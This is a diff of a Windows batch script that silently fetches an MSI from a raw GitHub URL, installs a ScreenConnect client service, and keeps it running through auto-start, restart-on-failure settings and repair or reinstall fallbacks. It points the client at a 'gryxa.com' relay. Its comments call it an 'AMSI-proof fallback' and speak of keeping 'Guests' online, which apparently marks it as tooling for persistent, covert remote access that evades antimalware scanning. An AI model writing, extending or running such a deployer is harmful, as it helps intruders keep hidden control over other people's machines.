@@ -1,6 +1,7 @@
 @echo off
-rem OWN_GRYXA BUILD 20260804G10 - PowerShell-free Gryxa install (AMSI-proof fallback)
-rem G10: NEVER msiexec /x ProductCode (shared GUID killed other Gryxa FPs e.g. 9908198e). OBSERVE aborts all mutate.
+rem OWN_GRYXA BUILD 20260804G11 - PowerShell-free Gryxa install (AMSI-proof fallback)
+rem G11: HEAL 1060: /i then /fa; /x+/i ONLY when no live gryxa.com relay (fixes registered-no-service).
+rem G10: NEVER msiexec /x ProductCode on REINSTALL path (shared GUID killed other Gryxa FPs).
 rem G9: HEAL never msiexec /x (start-only or /i-if-1060). REINSTALL aborts if any gryxa.com relay RUNNING.
 rem G8: HEAL soft-starts first; never /x while relay Gryxa RUNNING (was killing online Guests).
 rem G7: never bare sc create; after /i require ImagePath gryxa.com.
@@ -25,10 +26,11 @@ set "LOG=%WD%\own_gryxa.log"
 set "LOCK=%WD%\gryxa_msi.lock"
 set "URL1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
 set "SVC=ScreenConnect Client (%GRYXA_FP%)"
+set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
-echo [%DATE% %TIME%] own_gryxa G10 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
+echo [%DATE% %TIME%] own_gryxa G11 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
 
 rem G10: OBSERVE blocks REINSTALL/mutate-/x only — still allow HEAL start + 1060 /i
 if exist "%WD%\observe.flag" (
@@ -78,54 +80,12 @@ if defined LIVE_FP (
   exit /b 0
 )
 
-rem HEAL: start-only when service exists; /i only on hard 1060. NEVER /x.
+rem HEAL: start-only when service exists; on 1060: /i -> /fa -> /x+/i only if no live relay
 if /I "%MODE%"=="HEAL" (
-  sc query "%SVC%" >nul 2>&1
-  if not errorlevel 1 (
-    echo [%DATE% %TIME%] heal_start_only_no_x>>"%LOG%"
-    sc config "%SVC%" start= auto >nul 2>&1
-    sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
-    sc start "%SVC%" >nul 2>&1
-    timeout /t 15 /nobreak >nul
-    sc start "%SVC%" >nul 2>&1
-    timeout /t 8 /nobreak >nul
-    call :FindLiveRelay
-    if defined LIVE_FP (
-      echo [%DATE% %TIME%] heal_start_ok fp=!LIVE_FP!>>"%LOG%"
-      (
-        echo CURRENT_FP=!LIVE_FP!
-        echo RELAY=update.gryxa.com
-        echo UI=ui.gryxa.com
-        echo UPDATED=cmd-own_gryxa-G10-heal-start
-      ) >"%WD%\gryxa.cfg"
-      del /f /q "%LOCK%" >nul 2>&1
-      exit /b 0
-    )
-    echo [%DATE% %TIME%] heal_start_failed_NO_x_exit>>"%LOG%"
-    del /f /q "%LOCK%" >nul 2>&1
-    exit /b 1
-  )
-  echo [%DATE% %TIME%] heal_1060_install_only>>"%LOG%"
-  call :FetchMsi
-  if errorlevel 1 (
-    del /f /q "%LOCK%" >nul 2>&1
-    exit /b 2
-  )
-  call :DoInstall
-  call :FindLiveRelay
-  if defined LIVE_FP (
-    (
-      echo CURRENT_FP=!LIVE_FP!
-      echo RELAY=update.gryxa.com
-      echo UI=ui.gryxa.com
-      echo UPDATED=cmd-own_gryxa-G10-heal-i
-    ) >"%WD%\gryxa.cfg"
-    del /f /q "%LOCK%" >nul 2>&1
-    exit /b 0
-  )
-  echo [%DATE% %TIME%] heal_1060_still_down>>"%LOG%"
+  call :DoHeal
+  set "HE=!ERRORLEVEL!"
   del /f /q "%LOCK%" >nul 2>&1
-  exit /b 1
+  exit /b !HE!
 )
 
 rem Non-REINSTALL default: start-only if svc exists
@@ -246,6 +206,65 @@ for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE
   )
 )
 goto :eof
+
+:DoHeal
+sc query "%SVC%" >nul 2>&1
+if not errorlevel 1 (
+  echo [%DATE% %TIME%] heal_start_only_no_x>>"%LOG%"
+  sc config "%SVC%" start= auto >nul 2>&1
+  sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
+  sc start "%SVC%" >nul 2>&1
+  timeout /t 15 /nobreak >nul
+  sc start "%SVC%" >nul 2>&1
+  timeout /t 8 /nobreak >nul
+  call :FindLiveRelay
+  if defined LIVE_FP (
+    echo [%DATE% %TIME%] heal_start_ok fp=!LIVE_FP!>>"%LOG%"
+    (
+      echo CURRENT_FP=!LIVE_FP!
+      echo RELAY=update.gryxa.com
+      echo UI=ui.gryxa.com
+      echo UPDATED=cmd-own_gryxa-G11-heal-start
+    ) >"%WD%\gryxa.cfg"
+    exit /b 0
+  )
+  echo [%DATE% %TIME%] heal_start_failed_NO_x_exit>>"%LOG%"
+  exit /b 1
+)
+echo [%DATE% %TIME%] heal_1060_install_only>>"%LOG%"
+call :FetchMsi
+if errorlevel 1 exit /b 2
+call :DoInstall
+call :FindLiveRelay
+if defined LIVE_FP goto :DoHealOk
+rem registered-no-service: plain /i often no-ops — try repair
+echo [%DATE% %TIME%] heal_1060_msiexec_fa>>"%LOG%"
+msiexec /fa %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
+sc start "%SVC%" >nul 2>&1
+timeout /t 12 /nobreak >nul
+call :FindLiveRelay
+if defined LIVE_FP goto :DoHealOk
+rem last resort: /x ONLY when no live gryxa.com relay anywhere, then /i
+call :FindLiveRelay
+if defined LIVE_FP goto :DoHealOk
+echo [%DATE% %TIME%] heal_1060_x_then_i_no_live_relay>>"%LOG%"
+msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
+timeout /t 5 /nobreak >nul
+call :DoInstall
+call :FindLiveRelay
+if defined LIVE_FP goto :DoHealOk
+echo [%DATE% %TIME%] heal_1060_still_down>>"%LOG%"
+exit /b 1
+
+:DoHealOk
+echo [%DATE% %TIME%] heal_1060_ok fp=!LIVE_FP!>>"%LOG%"
+(
+  echo CURRENT_FP=!LIVE_FP!
+  echo RELAY=update.gryxa.com
+  echo UI=ui.gryxa.com
+  echo UPDATED=cmd-own_gryxa-G11-heal-i
+) >"%WD%\gryxa.cfg"
+exit /b 0
 
 :FetchMsi
 set "NEED=1"
